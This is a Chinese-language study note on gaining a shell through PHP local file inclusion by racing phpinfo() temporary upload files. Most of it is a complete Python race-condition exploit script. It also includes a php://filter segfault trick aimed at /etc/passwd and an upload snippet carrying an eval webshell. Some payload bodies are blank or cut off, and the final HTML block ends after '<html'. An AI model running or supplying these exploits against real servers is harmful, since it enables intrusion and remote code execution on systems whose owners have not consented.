我们上传文件，实际上都是在修改我们的 file 文件当中的文件。

我们构造一个上传表单的时候,php 也会生成一个对应的临时文件,这个文件的相关内容可以在 phpinfo()的 `_FILE["file"]` 查看到,但是临时文件很快就会被删除,所以我们赶在临时文件被删除之前,包含临时文件就可以 getshell 了。

php 处理流程 timeline 如下:
![[Pasted image 20240429203505.png]]

**也就是说，我们只要能够获得一个 phpinfo 的页面，并且我们的对应的配置是打开的，那么我们就能够利用我们的这一个漏洞**。

## 操作思路：
### 条件竞争：
```python
#!/usr/bin/python 
import sys
import threading
import socket

def setup(host, port):
    TAG="Security Test"
    PAYLOAD="""%s\r
<?php                                                              ?>');?>\r""" % TAG
    REQ1_DATA="""-----------------------------7dbff1ded0714\r
Content-Disposition: form-data; name="dummyname"; filename="test.txt"\r
Content-Type: text/plain\r
\r
%s
-----------------------------7dbff1ded0714--\r""" % PAYLOAD
    padding="A" * 5000
    # 这里需要修改为phpinfo.php的地址
    REQ1="""POST /phpinfo.php?a="""+padding+""" HTTP/1.1\r
Cookie: PHPSESSID=q249llvfromc1or39t6tvnun42; othercookie="""+padding+"""\r
HTTP_ACCEPT: """ + padding + """\r
HTTP_USER_AGENT: """+padding+"""\r
HTTP_ACCEPT_LANGUAGE: """+padding+"""\r
HTTP_PRAGMA: """+padding+"""\r
Content-Type: multipart/form-data; boundary=---------------------------7dbff1ded0714\r
Content-Length: %s\r
Host: %s\r
\r
%s""" %(len(REQ1_DATA),host,REQ1_DATA)
    #modify this to suit the LFI script   
    LFIREQ="""GET /lfi.php?file=%s HTTP/1.1\r
User-Agent: Mozilla/4.0\r
Proxy-Connection: Keep-Alive\r
Host: %s\r
\r
\r
"""
    return (REQ1, TAG, LFIREQ)

def phpInfoLFI(host, port, phpinforeq, offset, lfireq, tag):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)    

    s.connect((host, port))
    s2.connect((host, port))

    s.send(phpinforeq)
    d = ""
    while len(d) < offset:
        d += s.recv(offset)
    try:
        i = d.find("[tmp_name] =&gt; ")
        fn = d[i+17:i+31]
        # print fn
    except ValueError:
        return None
    s2.send(lfireq % (fn, host))
    # print lfireq % (fn, host) #debug调试结果
    d = s2.recv(4096)
    # print d #查看回显是否成功
    s.close()
    s2.close()

    if d.find(tag) != -1:
        return fn

counter=0
class ThreadWorker(threading.Thread):
    def __init__(self, e, l, m, *args):
        threading.Thread.__init__(self)
        self.event = e
        self.lock =  l
        self.maxattempts = m
        self.args = args

    def run(self):
        global counter
        while not self.event.is_set():
            with self.lock:
                if counter >= self.maxattempts:
                    return
                counter+=1

            try:
                x = phpInfoLFI(*self.args)
                if self.event.is_set():
                    break                
                if x:
                    print "\nGot it! Shell created in /tmp/g"
                    self.event.set()

            except socket.error:
                return

def getOffset(host, port, phpinforeq):
    """Gets offset of tmp_name in the php output"""
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host,port))
    s.send(phpinforeq)

    d = ""
    while True:
        i = s.recv(4096)
        d+=i        
        if i == "":
            break
        # detect the final chunk
        if i.endswith("0\r\n\r\n"):
            break
    s.close()
    i = d.find("[tmp_name] =&gt; ")
    if i == -1:
        raise ValueError("No php tmp_name in phpinfo output")

    print "found %s at %i" % (d[i:i+10],i)
    # padded up a bit
    return i+256

def main():

    print "LFI With PHPInfo()"
    print "-=" * 30

    if len(sys.argv) < 2:
        print "Usage: %s host [port] [threads]" % sys.argv[0]
        sys.exit(1)

    try:
        host = socket.gethostbyname(sys.argv[1])
    except socket.error, e:
        print "Error with hostname %s: %s" % (sys.argv[1], e)
        sys.exit(1)

    port=80
    try:
        port = int(sys.argv[2])
    except IndexError:
        pass
    except ValueError, e:
        print "Error with port %d: %s" % (sys.argv[2], e)
        sys.exit(1)

    poolsz=10
    try:
        poolsz = int(sys.argv[3])
    except IndexError:
        pass
    except ValueError, e:
        print "Error with poolsz %d: %s" % (sys.argv[3], e)
        sys.exit(1)

    print "Getting initial offset...",  
    reqphp, tag, reqlfi = setup(host, port)
    offset = getOffset(host, port, reqphp)
    sys.stdout.flush()

    maxattempts = 1000
    e = threading.Event()
    l = threading.Lock()

    print "Spawning worker pool (%d)..." % poolsz
    sys.stdout.flush()

    tp = []
    for i in range(0,poolsz):
        tp.append(ThreadWorker(e,l,maxattempts, host, port, reqphp, offset, reqlfi, tag))

    for t in tp:
        t.start()
    try:
        while not e.wait(1):
            if e.is_set():
                break
            with l:
                sys.stdout.write( "\r% 4d / % 4d" % (counter, maxattempts))
                sys.stdout.flush()
                if counter >= maxattempts:
                    break
        print
        if e.is_set():
            print "Woot!  \m/"
        else:
            print ":("
    except KeyboardInterrupt:
        print "\nTelling threads to shutdown..."
        e.set()

    print "Shuttin' down..."
    for t in tp:
        t.join()

if __name__=="__main__":
    main()
```


### php 7.0
我们可以通过我们造成段错误：
```
file=php://filter/string.strip_tags/resouce=/etc/passwd
```

最后，就会放我们的临时文件变成永久文件。这个时候，我们就可以找到我们的 php 文件的路径。

```
import requests
url="对应的网页，以及phpinfo的位置,file=php://filter/string.strip_tags/resouce=/etc/passwd"
payload=b"<?phpinfo();eval(__POST[0])?> #你要写的木马
file=[('file',("hack.jpg",payload,"image/jpeg"))]
res=requets.post(url=url,files=file)

```

### 自包含方法：
如果我们在一个界面，又有包含，又能够获得 php 请求
```
if(isset($_GET['info'])){
	phpinfo();
}
$page=$_GET['page'];
include ($page)
```

那么，如果我们让我们的 `page=index.php`,这个时候，我们就会一直在进行包含，这个时候，我们就可以在这个时候，实现我们的文件写。**同时，我们还需要能够得到我们的 phpinfo**.

第一步：我们写一个一句话木马文档：
```
<?php
                                                                               ?>");
?>
```

第二步，我们在上传我们的一句话木马文档的同时，我们再去找到我们的这文档的对应的路径。我们的 php 界面找我们的
`$_FILE['file']` 变量中的 `tmp_name`。就可以得到我们的文件对应的路径。

这里，我们使用的是我们自带的 html 语言对应的表单
```
<html
```


第三步，我们访问对应的路径，然后就能在我们的 `/tmp/shell.php` 找到我们的木马。




